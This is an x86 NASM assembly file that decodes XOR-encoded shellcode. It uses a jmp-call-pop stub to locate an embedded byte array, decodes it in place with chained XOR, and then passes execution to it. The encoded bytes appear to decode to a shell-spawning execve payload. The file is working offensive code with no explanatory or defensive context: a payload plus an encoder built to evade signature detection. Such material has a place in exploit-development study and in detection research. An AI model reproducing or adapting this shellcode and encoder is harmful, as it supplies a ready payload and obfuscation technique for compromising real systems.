; Filename: decoder.nasm
; Purpose: decoding encoded shellcode using XOR

global _start

section .text
_start:
	jmp short call_decoder


decoder:
	pop esi
	xor eax, eax
	cdq
	mov al, 0xAA   ; will be xored only with first byte
decode:
	mov dl, [esi]
	xor al, dl
	jz Shellcode   ; if mark is reached pass exeution to shellcode
	mov [esi], al
	mov al, dl
	inc esi
	jmp short decode ; loop again and continue decoding

call_decoder:

	call decoder
;-------------------------------------------------------------------
; as a mark added the last byte again to stop the decoding process and pass exeution

	Shellcode: db 0x9b, 0x5b, 0xb, 0x63, 0xd, 0x22, 0x51, 0x39, 0x51, 0x7e, 0x51, 0x33, 0x5a, 0xd3, 0x30, 0x60, 0xe9, 0xb, 0x58, 0xd1, 0x30, 0x80, 0x8b, 0x46, 0xc6, 0xc6


